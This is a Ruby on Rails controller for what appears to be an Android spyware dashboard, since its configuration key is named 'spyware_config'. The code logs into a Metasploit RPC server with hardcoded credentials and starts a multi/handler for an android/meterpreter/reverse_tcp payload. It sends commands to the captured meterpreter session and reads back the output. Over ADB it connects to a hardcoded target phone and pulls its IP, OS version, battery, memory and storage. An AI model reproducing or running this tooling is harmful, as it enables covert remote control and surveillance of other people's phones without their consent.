class ApplicationController < ActionController::Base
  @@isAdbConnected=false
  @@isMsfConnected=false
  @@cpuUsage=0
  @@memoryUsage=0
  @@storage=0
  @@nrFinishedProcesses=0
  @@nrRunningProcesses=0
  @@soundMode=2
  @@isAdbStarted=false
  @@ipAddress="Unknown"
  @@operatingSystem="Unknown"
  @@isRooted="Unknown"
  @@batteryLevel="Unknown"
  @@localHour="Unknown"


    def start_msf_process(command)
      begin
        require 'msfrpc-client'
        require 'date'

        @@nrRunningProcesses+=1
        user = 'cool'
        password = 'looc'
        options = {
          host: '127.0.0.1',
          port: 3333,
          uri:  '/api/',
          ssl:  true
        }
        rpc = Msf::RPC::Client.new(options)
        rpc.login(user, password)
        payloadOptions = {
          'PAYLOAD' => 'android/meterpreter/reverse_tcp',
          'LHOST'   => '0.0.0.0',
          'LPORT'   => 4444
        }
        job = rpc.call('module.execute', 'exploit', 'multi/handler', payloadOptions)
        session=rpc.call('session.list').keys[0]

        puts rpc.call('session.meterpreter_write', session, command)
        sleep 4
        commandOutput = rpc.call('session.meterpreter_read', session).values()[0].split('\n')
      rescue Msf::RPC::ServerException => e
        commandOutput="Operation Failed"
        puts e
      end
        puts commandOutput

      @@nrFinishedProcesses+=1
      @@nrRunningProcesses-=1
      return commandOutput      
    end

    def run_adb_command(command)
      @@nrRunningProcesses+=1
      commandOutput=`tools\\platform-tools\\adb.exe -s #{Rails.configuration.spyware_config['target_ip']} #{command}`
      @@nrFinishedProcesses+=1
      @@nrRunningProcesses-=1
      return commandOutput
    end

    def detach_session
        require 'msfrpc-client'
        require 'date'
        user = 'cool'
        password = 'looc'
        options = {
          host: '127.0.0.1',
          port: 3333,
          uri:  '/api/',
          ssl:  true
        }
        rpc = Msf::RPC::Client.new(options)
        rpc.login(user, password)
        payloadOptions = {
          'PAYLOAD' => 'android/meterpreter/reverse_tcp',
          'LHOST'   => '0.0.0.0',
          'LPORT'   => 4444
        }
        job = rpc.call('module.execute', 'exploit', 'multi/handler', payloadOptions)
        session=rpc.call('session.list').keys[0]

        puts rpc.call('session.meterpreter_session_detach', session)
        sleep 4
        commandOutput = rpc.call('session.meterpreter_read', session).values()[0].split('\n')
        return commandOutput

    end


    def check_connection
      #puts @@nrRunningProcesses
      #puts @@nrFinishedProcesses
      @@cpuUsage = @@memoryUsage = @@storage = 0

      #puts Rails.configuration.spyware_config['target_ip'] #=>7474#{@fileName}
      if ! @@isAdbConnected
          system("tools\\platform-tools\\adb.exe kill-server")
          system("tools\\platform-tools\\adb.exe tcpip 5555")
          system("tools\\platform-tools\\adb.exe connect #{Rails.configuration.spyware_config['target_ip']}")
      end
      adbDevices=`tools\\platform-tools\\adb.exe devices`.split("\n")
      if adbDevices.any? {|line| line =~ /#{Rails.configuration.spyware_config['target_ip']}:5555\s+device/ }#adbDevices.size > 1
        @@isAdbConnected=true
        @@ipAddress=`tools\\platform-tools\\adb.exe -s 192.168.100.33 shell "ip addr show wlan0 | grep inet | grep -v inet6"`.split[1].gsub(/\/\d*/,'')
        @@operatingSystem='Android ' + `tools\\platform-tools\\adb.exe -s 192.168.100.33 shell getprop ro.build.version.release`.strip
        @@isRooted="Rooted: No"
        @@localHour=`tools\\platform-tools\\adb.exe -s 192.168.100.33 shell date +%R`.strip
        @@batteryLevel=`tools\\platform-tools\\adb.exe -s 192.168.100.33 shell "dumpsys battery | grep level"`.split(':')[1].strip + '%'
        memoryTotal=`tools\\platform-tools\\adb.exe -s 192.168.100.33 shell "cat /proc/meminfo | grep MemTotal"`.strip.gsub(/\D/, '').to_f
        memoryAvailable=`tools\\platform-tools\\adb.exe -s 192.168.100.33 shell "cat /proc/meminfo | grep MemAvailable"`.strip.gsub(/\D/, '').to_f

        #puts(memoryTotal)
        #puts(memoryAvailable)
        @@memoryUsage=((memoryTotal- memoryAvailable)/memoryTotal * 100).to_i
        #puts @@memoryUsage
        #cpuFields=`tools\\platform-tools\\adb.exe shell "cat /proc/stat | grep 'cpu '"`.strip.split

        #cpuOutput=`tools\\platform-tools\\adb.exe -s 192.168.100.33 shell "top -n 1 | grep User | grep %"`
        ##userCPU=/User (.*)%, System/.match(cpuOutput).captures[0].to_i
        ##systemCPU=/System (.*)%, IOW/.match(cpuOutput).captures[0].to_i
        @@cpuUsage=2#userCPU + systemCPU
        #puts @@cpuUsage

        totalMemory=`tools\\platform-tools\\adb.exe -s 192.168.100.33 shell "df /storage/emulated | tail -n +2"`.strip.split[1].gsub(/[^\d\.]/, '').to_f
        usedMemory=`tools\\platform-tools\\adb.exe -s 192.168.100.33 shell "df /storage/emulated | tail -n +2"`.strip.split[2].gsub(/[^\d\.]/, '').to_f
        @@storage=(usedMemory / totalMemory * 100).to_i
      end

      msfConnected=false
      begin


            require 'msfrpc-client'
            require 'date'
            user = 'cool'
            password = 'looc'
            options = {
              host: '127.0.0.1',
              port: 3333,
              uri:  '/api/',
              ssl:  true
            }
            rpc = Msf::RPC::Client.new(options)
            rpc.login(user, password)
            payloadOptions = {
              'PAYLOAD' => 'android/meterpreter/reverse_tcp',
              'LHOST'   => '0.0.0.0',
              'LPORT'   => 4444
            }
            job = rpc.call('module.execute', 'exploit', 'multi/handler', payloadOptions)
            sessions=rpc.call('session.list')
            @@isMsfConnected=sessions.size > 0 ? true : false
      rescue Msf::RPC::ServerException => e
            puts e
            puts "Docker MSF Container is Down"
      end
      respond_to do |format|
        format.js { render "check_connection", :locals => {:adbConnected => @@isAdbConnected,
                   :msfConnected => @@isMsfConnected, :cpuUsage => @@cpuUsage, :memoryUsage => @@memoryUsage, :storage => @@storage,
                   :nrRunningProcesses => @@nrRunningProcesses, :nrFinishedProcesses => @@nrFinishedProcesses,
                   :ipAddress => @@ipAddress, :operatingSystem => @@operatingSystem, :isRooted => @@isRooted,
                   :batteryLevel => @@batteryLevel, :localHour => @@localHour }  }
      end

    end
end
